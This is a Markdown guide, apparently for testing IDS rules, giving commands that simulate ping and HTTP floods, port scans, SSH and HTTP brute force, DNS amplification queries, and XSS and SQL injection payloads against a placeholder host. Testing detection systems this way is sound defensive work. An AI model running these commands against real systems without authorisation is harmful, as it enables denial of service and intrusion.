# Attack Simulation Scenarios

This document provides instructions to simulate different types of network and web attacks for testing detection systems like IDS/IPS (e.g., Snort, Suricata).

---

## 1. Ping Flood Attack (ICMP Flood) - Rule 1
Send continuous ICMP Echo Requests to overload the target.

**Command using `ping`:**
```bash
ping -f -s 0 <HOME_NET_IP>
```
- `-f`: flood mode (send as fast as possible)
- `-s 0`: payload size 0 bytes

**Alternative using `hping3`:**
```bash
hping3 -1 --flood <HOME_NET_IP>
```
- `-1`: ICMP mode
- `--flood`: send packets as fast as possible

---

## 2. External Port Scan (SYN Scan) - Rule 2
Perform a TCP SYN port scan on the target.

**Command using `nmap`:**
```bash
nmap -sS -p- <HOME_NET_IP>
```
- `-sS`: Stealth SYN scan
- `-p-`: scan all ports

**Faster alternative using `hping3`:**
```bash
hping3 -S -p ++20 -c 50 <HOME_NET_IP>
```
- `-S`: TCP SYN flag
- `-p ++20`: increment port number every packet
- `-c 50`: 50 packets

---

## 3. SSH Brute Force Attempt - Rule 3
Simulate SSH login brute force attempts.

**Using `hydra`:**
```bash
hydra -l root -P /path/to/wordlist.txt ssh://<HOME_NET_IP>
```

**Manual simulation:**
```bash
for i in {1..10}; do ssh invaliduser@<HOME_NET_IP> -p 22; done
```

---

## 4. HTTP DoS Attempt - Rule 4
Send many concurrent HTTP GET requests.

**Using `ab` (Apache Benchmark):**
```bash
ab -n 1000 -c 100 http://<HOME_NET_IP>/
```
- `-n 1000`: total requests
- `-c 100`: concurrent requests

**Alternative using `hping3`:**
```bash
hping3 -c 1000 -d 120 -S -p 80 --flood <HOME_NET_IP>
```

---

## 5. DNS Amplification Attack - Rule 5
Simulate a DNS Amplification request.

**Single `dig` request:**
```bash
dig @<HOME_NET_IP> example.com ANY +udp
```

**Multiple requests:**
```bash
for i in {1..500}; do dig @<HOME_NET_IP> example.com ANY +udp; done
```

---

## 6. XSS Attack (Injection Payload)
Inject basic XSS payloads into web applications.

**Simple XSS injection:**
```bash
curl -X GET "http://<HOME_NET_IP>/?q=<script>alert(1)</script>"
```

**Encoded XSS injection:**
```bash
curl -G --data-urlencode "q=%3Cscript%3Ealert(1)%3C%2Fscript%3E" http://<HOME_NET_IP>/
```

**Special character injection:**
```bash
curl -G --data-urlencode "q=%22" http://<HOME_NET_IP>/
```

---

## 7. SQL Injection Attack
Simulate SQL Injection attempts.

**Using `curl` with sample payloads:**
```bash
curl -G --data-urlencode "q=select * from users" http://<HOME_NET_IP>/
```

```bash
curl -G --data-urlencode "q=union select username,password from admin" http://<HOME_NET_IP>/
```

**Using `sqlmap`:**
```bash
sqlmap -u "http://<HOME_NET_IP>/search.php?q=test" --dbs
```

---

## 8. HTTP Brute Force (Username + Password POST) - Rule 8
Perform HTTP POST login brute force.

**Using `curl` in a loop:**
```bash
for i in {1..10}; do 
  curl -X POST http://<HOME_NET_IP>/login -d "username=admin&password=wrongpass";
  sleep 1;
 done
```
- Send repeated login attempts with incorrect credentials.

---

# Notes:
- Replace `<HOME_NET_IP>` with your target IP address.
- Be cautious and ensure you have permission to perform these tests.
- These simulations are intended for legal and educational purposes only.

---

# Disclaimer
**This document is for educational and authorized testing purposes only. Unauthorized use is illegal.**
